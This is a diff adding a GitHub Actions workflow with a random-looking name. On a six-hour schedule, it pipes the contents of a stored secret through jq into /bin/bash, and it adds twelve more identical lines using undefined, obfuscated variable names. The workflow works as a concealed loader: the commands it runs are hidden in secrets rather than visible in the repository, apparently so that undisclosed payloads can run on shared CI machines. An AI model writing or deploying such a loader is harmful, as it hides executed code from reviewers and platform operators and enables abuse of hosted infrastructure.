@@ -1,0 +1,29 @@
+name: youluyuan3412
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '20 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: youluyuan3412
+        env:
+          f240: ${{ secrets.f240 }}
+        run: |
+          echo $f240 | jq -r .mpioh08 | /bin/bash
+          echo $r683 | jq -r .udfhm0231 | /bin/bash
+          echo $fkjen75 | jq -r .ogfux0620 | /bin/bash
+          echo $lxa97 | jq -r .yufa560 | /bin/bash
+          echo $fnzz8 | jq -r .mosgi23 | /bin/bash
+          echo $xh3 | jq -r .duk70 | /bin/bash
+          echo $m38679 | jq -r .vy1 | /bin/bash
+          echo $a622 | jq -r .xm5 | /bin/bash
+          echo $bduf965 | jq -r .vzqir5342 | /bin/bash
+          echo $k476 | jq -r .id476 | /bin/bash
+          echo $ya8450 | jq -r .to1150 | /bin/bash
+          echo $bz1 | jq -r .gws43 | /bin/bash
+          echo $qsg00012 | jq -r .obpr8 | /bin/bash
+
